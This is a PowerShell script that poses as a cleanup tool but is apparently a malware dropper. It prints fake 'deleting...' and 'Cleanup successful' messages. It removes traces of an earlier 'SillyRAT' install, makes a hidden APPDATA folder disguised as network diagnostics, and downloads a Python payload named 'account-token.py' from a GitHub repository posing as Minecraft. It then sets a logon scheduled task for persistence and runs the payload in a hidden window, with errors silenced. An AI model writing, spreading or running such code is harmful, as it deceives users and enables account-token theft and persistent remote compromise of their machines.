# 1. Kill the visible processes
Write-Host "deleting..." -ForegroundColor Gray
Stop-Process -Name "pythonw" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "JavaUpdateHost" -Force -ErrorAction SilentlyContinue

# 2. Clean up the Startup Registry
Write-Host "deleting..." -ForegroundColor Gray
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Remove-ItemProperty -Path $RegPath -Name "SillyRAT" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $RegPath -Name "JavaUpdater" -ErrorAction SilentlyContinue

# 3. Setup Hidden Path
$Dir = "$env:APPDATA\Microsoft\NetworkDiagnostics"
if (-not (Test-Path $Dir)) { 
    New-Item -ItemType Directory -Path $Dir -Force | Out-Null
    (Get-Item $Dir).Attributes = 'Hidden'
}

# 4. Define Paths and URLs
$PayloadUrl = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
# Update the link below to your raw GitHub link for pythonw.exe if you have it uploaded
$PythonUrl  = "https://github.com/get-activated/com.mojang.minecraft/raw/main/pythonw.exe" 

$Path = "$Dir\win_sys_helper.pyw"
$StealthExe = "$Dir\WinNetHost.exe"

# 5. Download Payload & Engine (Silent)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $Path -UseBasicParsing | Out-Null

if (-not (Test-Path $StealthExe)) {
    # Try to get it from Temp first (Fast)
    if (Test-Path "$env:TEMP\sys_cache\pythonw.exe") {
        Copy-Item "$env:TEMP\sys_cache\pythonw.exe" $StealthExe -Force | Out-Null
    } 
    # If not in Temp, download it (Reliable)
    else {
        Invoke-WebRequest -Uri $PythonUrl -OutFile $StealthExe -UseBasicParsing | Out-Null
    }
}

# 6. Create Task (Silenced)
$A = New-ScheduledTaskAction -Execute $StealthExe -Argument $Path
$T = New-ScheduledTaskTrigger -AtLogOn
$S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $A -Trigger $T -Settings $S -TaskName "WinNetDiagnostic" -Force | Out-Null

# 7. Execute (ErrorAction ensures NO RED TEXT shows if it fails)
Start-Process $StealthExe -ArgumentList $Path -WindowStyle Hidden -ErrorAction SilentlyContinue

Write-Host "deleting..." -ForegroundColor Gray
Write-Host "Cleanup successful. Old logs and temporary files removed." -ForegroundColor Green
